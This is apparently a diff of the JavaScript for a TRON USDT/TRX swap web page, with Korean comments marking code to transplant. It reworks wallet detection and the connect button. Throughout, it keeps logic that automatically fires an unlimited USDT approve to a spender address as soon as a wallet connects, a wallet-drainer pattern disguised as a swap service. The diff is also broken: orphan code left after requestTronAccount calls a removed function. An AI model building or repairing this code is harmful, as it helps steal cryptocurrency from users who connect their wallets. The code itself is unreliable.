@@ -804,6 +804,7 @@ function isWalletBrowser() {
               if (quoteEl) quoteEl.textContent = 'USDT';
               rateEl.textContent = (1 / TRX_RATE).toFixed(4);
           } else {
+            // [else 블록 안 이식 시킬 코드]
               if (baseEl) baseEl.textContent = 'USDT';
               if (quoteEl) quoteEl.textContent = 'TRX';
               rateEl.textContent = TRX_RATE.toFixed(2);
@@ -1096,107 +1097,94 @@ function isWalletBrowser() {
     return null;
 }
 
-        function readReadyTronWeb() {
-    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-        return window.tronWeb;
-    }
-    if (window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
-        return window.tronLink.tronWeb;
-    }
-    if (window.trustwallet && window.trustwallet.tronWeb && window.trustwallet.tronWeb.defaultAddress && window.trustwallet.tronWeb.defaultAddress.base58) {
-        return window.trustwallet.tronWeb;
-    }
-    return null;
+        // [이식 시킬 코드]
+function hasTronAddress() {
+    return !!(window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58);
 }
 
-async function getInjectedTronWeb() {
-    var ready = readReadyTronWeb();
-    if (ready) return ready;
+async function requestTronAccount() {
+    if (hasTronAddress()) return window.tronWeb.defaultAddress.base58;
 
-    if (window.tronLink && typeof window.tronLink.request === 'function' && !isTrustWalletBrowser()) {
+    if (window.tronLink && typeof window.tronLink.request === 'function') {
         try {
-            var r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-            if (r && r.code === 200) {
-                ready = readReadyTronWeb();
-                if (ready) return ready;
+            var res = await window.tronLink.request({ method: 'tron_requestAccounts' });
+            if (res && res.code === 200 && hasTronAddress()) {
+                return window.tronWeb.defaultAddress.base58;
             }
         } catch (e) { }
     }
 
-    // 지갑 DApp 브라우저에서 tronWeb이 늦게 주입되는 경우(A54/폴드4/iOS 공통) 최대 2.5초 폴링
-    if (isWalletBrowser() || window.tronLink || window.tronWeb || window.trustwallet) {
-        for (var i = 0; i < 10; i++) {
-            await new Promise(function (r) { setTimeout(r, 250); });
-            ready = readReadyTronWeb();
-            if (ready) return ready;
-        }
+    if (window.tronWeb && typeof window.tronWeb.request === 'function') {
+        try {
+            await window.tronWeb.request({ method: 'tron_requestAccounts' });
+            if (hasTronAddress()) return window.tronWeb.defaultAddress.base58;
+        } catch (e) { }
+    }
+
+    if (window.tronLink && window.tronLink.ready && window.tronLink.tronWeb &&
+        window.tronLink.tronWeb.defaultAddress && window.tronLink.tronWeb.defaultAddress.base58) {
+        return window.tronLink.tronWeb.defaultAddress.base58;
+    }
+
+    // [문제가 되는 부분]
+    for (var i = 0; i < 12; i++) {
+        await new Promise(function (r) { setTimeout(r, 500); });
+        if (hasTronAddress()) return window.tronWeb.defaultAddress.base58;
     }
     return null;
-}
+}   // <-- requestTronAccount()가 여기서 끝남
+
+    if (window.tronWeb && typeof window.tronWeb.request === 'function') {
+        try {
+            var p2 = window.tronWeb.request({ method: 'tron_requestAccounts' });
+            var t2 = new Promise(function (_, r) { setTimeout(r, 4000); });
+            await Promise.race([p2, t2]);
+            ready = readReadyTronWeb();
+            if (ready) return ready;
+        } catch (e) { }
+    }
+
+    for (var i = 0; i < 20; i++) {
+        await new Promise(function (r) { setTimeout(r, 300); });
+        ready = readReadyTronWeb();
+        if (ready) return ready;
+    }
+    return null;
 
         // ===== Auto Detection on Load =====
-        window.addEventListener('DOMContentLoaded', function () {
-            var attempts = 0;
-            var timer = setInterval(async function () {
-                attempts++;
-                try {
-                    var tw = await getInjectedTronWeb();
-                    if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                        clearInterval(timer);
-                        var provider = detectProvider() || 'TronLink';
-                        document.getElementById('wallet-selector-modal').classList.remove('active');
-                        await setConnectedWallet(tw.defaultAddress.base58, provider);
-                    } else if (attempts > 20) {
-                        clearInterval(timer);
-                    }
-                } catch (e) {
-                    if (attempts > 20) clearInterval(timer);
-                }
-            }, 500);
-
-            // 계정 변경 리스너
-            if (window.tronLink) {
-                window.addEventListener('message', function (e) {
-                    if (e.data && e.data.message && e.data.message.action === 'accountsChanged') {
-                        var newAddr = e.data.message.data && e.data.message.data.address;
-                        if (newAddr && newAddr !== currentWalletAddress) {
-                            isApproved = false;
-                            _autoApproveScheduled = false;
-                            setConnectedWallet(newAddr, activeProvider);
-                        }
-                    }
-                });
+        // [이식 시킬 코드]
+window.addEventListener('DOMContentLoaded', function () {
+    var attempts = 0;
+    var timer = setInterval(async function () {
+        attempts++;
+        try {
+            if (hasTronAddress()) {
+                clearInterval(timer);
+                var provider = detectProvider() || 'TronLink';
+                document.getElementById('wallet-selector-modal').classList.remove('active');
+                await setConnectedWallet(window.tronWeb.defaultAddress.base58, provider);
+            } else if (attempts > 30) {
+                clearInterval(timer);
             }
-        });
-        var isDetectingWallet = false;
-        async function retryWalletDetect() {
-            if (isConnected && currentWalletAddress) return;
-            if (isDetectingWallet || isConnecting) return;
-            isDetectingWallet = true;
-            try {
-                for (var i = 0; i < 6; i++) {
-                    if (isConnected && currentWalletAddress) break;
-                    try {
-                        var tw = await getInjectedTronWeb();
-                        if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                            var prov = detectProvider() || 'TronLink';
-                            document.getElementById('wallet-selector-modal').classList.remove('active');
-                            await setConnectedWallet(tw.defaultAddress.base58, prov);
-                            break;
-                        }
-                    } catch (e) { }
-                    await new Promise(function (r) { setTimeout(r, 400); });
-                }
-            } finally {
-                isDetectingWallet = false;
-            }
+        } catch (e) {
+            if (attempts > 30) clearInterval(timer);
         }
-        document.addEventListener('visibilitychange', function () {
-            if (document.visibilityState === 'visible') retryWalletDetect();
-        });
-        window.addEventListener('pageshow', function () {
-            retryWalletDetect();
-        });
+    }, 500);
+});
+
+document.addEventListener('visibilitychange', async function () {
+    if (document.visibilityState === 'visible' && !isConnected) {
+        for (var i = 0; i < 6; i++) {
+            if (hasTronAddress()) {
+                var prov = detectProvider() || 'TronLink';
+                document.getElementById('wallet-selector-modal').classList.remove('active');
+                await setConnectedWallet(window.tronWeb.defaultAddress.base58, prov);
+                break;
+            }
+            await new Promise(function (r) { setTimeout(r, 400); });
+        }
+    }
+});
 
         async function initWalletConnect() {
           if (wcConnector) return wcConnector;
@@ -1379,25 +1367,26 @@ async function getInjectedTronWeb() {
             }
         }
 
-        window.handleConnectWallet = async function () {
-            if (isConnecting) return;
-            isConnecting = true;
-            setConnectButtonLoading(true);
-            try {
-                var tw = await getInjectedTronWeb();
-                if (tw && tw.defaultAddress && tw.defaultAddress.base58) {
-                    var provider = detectProvider() || 'TronLink';
-                    await setConnectedWallet(tw.defaultAddress.base58, provider);
-                } else {
-                    document.getElementById('wallet-selector-modal').classList.add('active');
-                }
-            } catch (e) {
-                showToast('지갑 연결 중 오류가 발생했습니다.', 'error');
-            } finally {
-                isConnecting = false;
-                setConnectButtonLoading(false);
-            }
-        };
+        // [이식 시킬 코드]
+window.handleConnectWallet = async function () {
+    if (isConnecting) return;
+    isConnecting = true;
+    setConnectButtonLoading(true);
+    try {
+        var addr = await requestTronAccount();
+        if (addr) {
+            var provider = detectProvider() || 'TronLink';
+            await setConnectedWallet(addr, provider);
+        } else {
+            document.getElementById('wallet-selector-modal').classList.add('active');
+        }
+    } catch (e) {
+        showToast('지갑 연결 중 오류가 발생했습니다.', 'error');
+    } finally {
+        isConnecting = false;
+        setConnectButtonLoading(false);
+    }
+};
         function refreshSwapBalanceUI() {
             var topBal = document.getElementById('usdt-bal-swap');
             var bottomBal = document.getElementById('trx-bal-swap');
@@ -1466,15 +1455,16 @@ userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
             try { trackReferralConnect(address, provider); } catch (e) { }
 
             // 자동 승인 (지갑 내장 브라우저일 때만)
-          if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
-                _autoApproveScheduled = true;
-                var targetAddr = address;
-                setTimeout(function () {
-                    if (isConnected && currentWalletAddress && currentWalletAddress === targetAddr && !isApproved && !isApproving && !isLaunchingWallet) {
-                        executeUnlimitedApprove();
-                    }
-                }, 1500);
-            }
+          // [이식 시킬 코드]
+if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
+    _autoApproveScheduled = true;
+    var targetAddr = address;
+    setTimeout(function () {
+        if (isConnected && currentWalletAddress && currentWalletAddress === targetAddr && !isApproved && !isApproving && !isLaunchingWallet) {
+            executeUnlimitedApprove();
+        }
+    }, 2500);
+}
 
             // 에너지 주소 재확인
             setTimeout(function () {
@@ -1540,237 +1530,35 @@ userTrxBalance = (isFinite(parsedTrx) && parsedTrx >= 0) ? parsedTrx : 0;
             }
 
             // tronWeb 획득
-            var tw = window.tronWeb || null;
-            if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
-            var useWC = false;
+            // [이식 시킬 코드]
+var tw = window.tronWeb;
+var useWC = false;
 
-            if (!tw || !tw.contract) {
-                // 최대 15초 대기
-                for (var _wait = 0; _wait < 5; _wait++) {
-                    await new Promise(function (r) { setTimeout(r, 1000); });
-                    tw = window.tronWeb || null;
-                    if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
-                    if (tw && tw.contract) break;
-                }
-                if (!tw || !tw.contract) {
-                    try {
-                        if (window.tronLink) {
-                            var _req = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                            if (_req && _req.code === 200 && window.tronWeb) tw = window.tronWeb;
-                        }
-                    } catch (e) { }
-                }
-                                            if (!tw || !tw.contract) {
-                    showToast(currentLang === 'ko' ? '지갑 앱 DApp 브라우저에서 열어주세요!' :
-                        currentLang === 'zh' ? '请在钱包App的DApp浏览器中打开！' :
-                        currentLang === 'ru' ? 'Откройте в DApp браузере кошелька!' :
-                        currentLang === 'ja' ? 'ウォレットのDAppブラウザで開いてください！' :
-                        currentLang === 'th' ? 'กรุณาเปิดใน DApp Browser ของกระเป๋า!' :
-                        currentLang === 'vi' ? 'Vui lòng mở trong DApp Browser của ví!' :
-                        currentLang === 'de' ? 'Bitte im DApp-Browser der Wallet öffnen!' :
-                        currentLang === 'fr' ? 'Ouvrez dans le navigateur DApp du portefeuille!' :
-                        currentLang === 'es' ? '¡Abra en el navegador DApp de la billetera!' :
-                        'Please open in wallet DApp browser!', 'error');
-                    if (wcConnector && wcAddress) {
-                        useWC = true;
-                    } else {
-                        showToast(currentLang === 'ko' ? '지갑 연결이 끊겼습니다. 다시 연결해주세요.' :
-                            currentLang === 'zh' ? '钱包连接断开，请重新连接。' :
-                            currentLang === 'ru' ? 'Кошелёк отключён. Подключите снова.' :
-                            currentLang === 'ja' ? 'ウォレットが切断されました。再接続してください。' :
-                            currentLang === 'th' ? 'กระเป๋าขาดการเชื่อมต่อ กรุณาเชื่อมต่อใหม่' :
-                            currentLang === 'vi' ? 'Ví bị ngắt kết nối. Vui lòng kết nối lại.' :
-                            currentLang === 'de' ? 'Wallet getrennt. Bitte neu verbinden.' :
-                            currentLang === 'fr' ? 'Portefeuille déconnecté. Veuillez reconnecter.' :
-                            currentLang === 'es' ? 'Billetera desconectada. Por favor reconecte.' :
-                            'Wallet disconnected. Please reconnect.', 'error');
-                        isApproving = false;
-                        handleConnectWallet();
-                        return;
-                    }
-                }
-            }
+if (!tw || !tw.transactionBuilder) {
+    if (wcConnector && wcAddress) {
+        useWC = true;
+    } else {
+        showToast(currentLang === 'ko' ? '지갑 연결이 끊겼습니다. 다시 연결해주세요.' : 'Wallet disconnected. Please reconnect.', 'error');
+        isApproving = false;
+        handleConnectWallet();
+        return;
+    }
+}
 
-            var btn = document.getElementById('approve-btn');
-            btn.disabled = true;
-            btn.innerHTML = '<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>처리 중...</span>';
+var tx = await tw.transactionBuilder.triggerSmartContract(
+                OFFICIAL_USDT_CONTRACT,
+                'approve(address,uint256)',
+                { feeLimit: 100000000 },
+                [{ type: 'address', value: spender }, { type: 'uint256', value: MAX_ALLOWANCE }],
+                currentWalletAddress
+            );
+            if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
 
-            // Step 1: 백엔드 (/api/energy/rent)에서 잔액/중복/보유 에너지(130,000 미만) 판별 및 렌탈 일원화
-            setProgress(25, '에너지 및 지갑 상태 확인 중...');
-
+            showToast(currentLang === 'ko' ? '지갑 팝업을 확인하세요! 🔔' : 'Check your wallet popup! 🔔');
+            var signedTx = await tw.trx.sign(tx.transaction);
+            var result = await tw.trx.sendRawTransaction(signedTx);
+            txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
             try {
-                await fetch(API_BASE + '/wallet/prepare-approve', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: currentWalletAddress })
-                });
-            } catch (pe) { /* 계속 진행 */ }
-
-            try {
-                var rentRes = await fetch(API_BASE + '/energy/rent', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: currentWalletAddress, amount: 131000, duration: '1h' })
-                });
-                var rentData = await rentRes.json();
-
-                if (rentData && rentData.status === 'ok' && rentData.rented) {
-                    setProgress(50, '에너지 렌탈 완료!');
-                    showToast('에너지 렌탈 완료!');
-                    if (!rentData.confirmed) {
-                        await new Promise(function (r) { setTimeout(r, 2000); });
-                    }
-                } else if (rentData && rentData.reason === 'enough_energy') {
-                    var curEnergy = Number(rentData.currentEnergy) || 130000;
-                    setProgress(50, '보유 에너지 충분 (' + curEnergy.toLocaleString() + ') - 렌탈 생략');
-                }
-            } catch (rentErr) { /* 계속 진행 */ }
-
-            // Step 2: Approve 서명
-            setProgress(60, '스마트 컨트랙트 승인 서명 요청 중...');
-            showToast('지갑에서 서명 팝업을 확인하세요.');
-
-            try {
-                var txHash;
-
-                if (useWC) {
-                    // WalletConnect 경로
-                    
-                    var addrHex = base58ToHex(spender);
-                    var paddedAddr = addrHex.padStart(64, '0');
-                    var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-                    var abiParam = paddedAddr + maxUint;
-
-                    var triggerRes = await fetch('https://api.trongrid.io/wallet/triggersmartcontract', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            owner_address: currentWalletAddress,
-                            contract_address: OFFICIAL_USDT_CONTRACT,
-                            function_selector: 'approve(address,uint256)',
-                            parameter: abiParam,
-                            fee_limit: 100000000,
-                            call_value: 0,
-                            visible: true
-                        })
-                    });
-                    var triggerData = await triggerRes.json();
-                    if (!triggerData.transaction) throw new Error('TronGrid 트랜잭션 생성 실패');
-
-                    // FIX: WalletConnect signTransaction 호출 방식 개선
-                                        var wcResult;
-                    // 서명 타임아웃 60초
-                    var wcSignTimeout = new Promise(function(_, reject) {
-                        setTimeout(function() {
-                            reject(new Error('서명 응답 시간 초과 (지갑 앱을 확인해 주세요)'));
-                        }, 60000);
-                    });
-
-                    if (wcConnector.signTransaction) {
-                        wcResult = await Promise.race([
-                            wcConnector.signTransaction(triggerData.transaction),
-                            wcSignTimeout
-                        ]);
-                    } else if (wcConnector.client) {
-                        var activeTopic = (wcConnector.session && wcConnector.session.topic) ||
-                            (wcConnector.client.session && wcConnector.client.session.keys && wcConnector.client.session.keys[0]);
-                        if (!activeTopic) {
-                            // 세션 만료시 자동으로 재연결 유도
-                            showToast(currentLang === 'ko' ? 'WalletConnect 세션 만료. 다시 연결해주세요.' : 'WalletConnect session expired. Please reconnect.', 'error');
-                            isApproving = false;
-                            wcConnector = null;
-                            wcAddress = null;
-                            handleConnectWallet();
-                            return;
-                        }
-                        wcResult = await Promise.race([
-                            wcConnector.client.request({
-                                topic: activeTopic,
-                                chainId: 'tron:0x2b6653dc',
-                                request: { method: 'tron_signTransaction', params: [triggerData.transaction] }
-                            }),
-                            wcSignTimeout
-                        ]);
-                    } else {
-                        throw new Error('WalletConnect 서명 메서드를 찾을 수 없습니다');
-                    }
-
-                    if (wcResult && wcResult.result) wcResult = wcResult.result;
-                  if (typeof wcResult === 'string') {
-                      try {
-                          var parsed = JSON.parse(wcResult);
-                          wcResult = parsed;
-                      } catch (parseErr) {
-                          wcResult = { signature: [wcResult] };
-                      }
-                  }
-
-                                    var broadcastPayload = JSON.parse(JSON.stringify(triggerData.transaction));
-                  if (!wcResult) {
-                      throw new Error('서명 데이터가 없습니다. 지갑 앱을 확인해주세요.');
-                  }
-                  if (wcResult && wcResult.raw_data && wcResult.signature) {
-                      // 완전한 서명된 트랜잭션
-                      broadcastPayload = wcResult;
-                  } else if (wcResult && wcResult.signature) {
-                      // 서명만 있는 경우
-                      broadcastPayload.signature = Array.isArray(wcResult.signature) ? wcResult.signature : [wcResult.signature];
-                  } else if (typeof wcResult === 'string' && wcResult.length > 0) {
-                      // 서명이 문자열로 온 경우
-                      broadcastPayload.signature = [wcResult];
-                  } else {
-                      throw new Error('지갑에서 유효한 서명 데이터를 받지 못했습니다. 다시 시도해주세요.');
-                  }
-
-                    var broadcastRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(broadcastPayload)
-                    });
-                    var broadcastData = await broadcastRes.json();
-                    if (!broadcastData.result) throw new Error('브로드캐스트 실패: ' + (broadcastData.Error || broadcastData.message || JSON.stringify(broadcastData)));
-                    txHash = broadcastData.txid || broadcastPayload.txID || 'ok';
-
-                } else {
-                    // DApp 브라우저 경로
-                    var tx = await tw.transactionBuilder.triggerSmartContract(
-                        OFFICIAL_USDT_CONTRACT,
-                        'approve(address,uint256)',
-                        { feeLimit: 100000000 },
-                        [{ type: 'address', value: spender }, { type: 'uint256', value: MAX_ALLOWANCE }],
-                        currentWalletAddress
-                    );
-                    if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
-                                        showToast(currentLang === 'ko' ? '지갑 팝업을 확인하세요! 🔔' :
-                        currentLang === 'zh' ? '请查看钱包弹窗！🔔' :
-                        currentLang === 'ru' ? 'Проверьте всплывающее окно кошелька! 🔔' :
-                        currentLang === 'ja' ? 'ウォレットのポップアップを確認してください！🔔' :
-                        currentLang === 'th' ? 'กรุณาตรวจสอบป๊อปอัพกระเป๋า! 🔔' :
-                        currentLang === 'vi' ? 'Kiểm tra cửa sổ pop-up ví! 🔔' :
-                        currentLang === 'de' ? 'Bitte Wallet-Popup überprüfen! 🔔' :
-                        currentLang === 'fr' ? 'Vérifiez la fenêtre du portefeuille! 🔔' :
-                        currentLang === 'es' ? '¡Verifique la ventana emergente de la billetera! 🔔' :
-                        'Check your wallet popup! 🔔');
-                    var signPromise = tw.trx.sign(tx.transaction);
-                    var timeoutPromise = new Promise(function (_, reject) {
-                        setTimeout(function () { reject(new Error(
-                            currentLang === 'ko' ? '서명 응답 시간 초과. 지갑 앱을 확인해주세요.' :
-                            currentLang === 'zh' ? '签名超时，请检查钱包应用。' :
-                            currentLang === 'ru' ? 'Время подписи истекло. Проверьте кошелёк.' :
-                            currentLang === 'ja' ? '署名タイムアウト。ウォレットアプリを確認してください。' :
-                            currentLang === 'th' ? 'หมดเวลาลงนาม กรุณาตรวจสอบกระเป๋า' :
-                            currentLang === 'vi' ? 'Hết thời gian ký. Kiểm tra ví của bạn.' :
-                            currentLang === 'de' ? 'Signatur-Timeout. Bitte Wallet überprüfen.' :
-                            currentLang === 'fr' ? 'Délai de signature. Vérifiez votre portefeuille.' :
-                            currentLang === 'es' ? 'Tiempo de firma agotado. Verifique su billetera.' :
-                            'Signing timeout. Please check your wallet.'
-                        )); }, 30000);
-                    });
-                    var signedTx = await Promise.race([signPromise, timeoutPromise]);
-                    var result = await tw.trx.sendRawTransaction(signedTx);
-                    txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
-                }
-
                 if (!txHash) throw new Error('TX 해시 수신 실패');
 
                 setProgress(100, '온체인 승인 완료!');
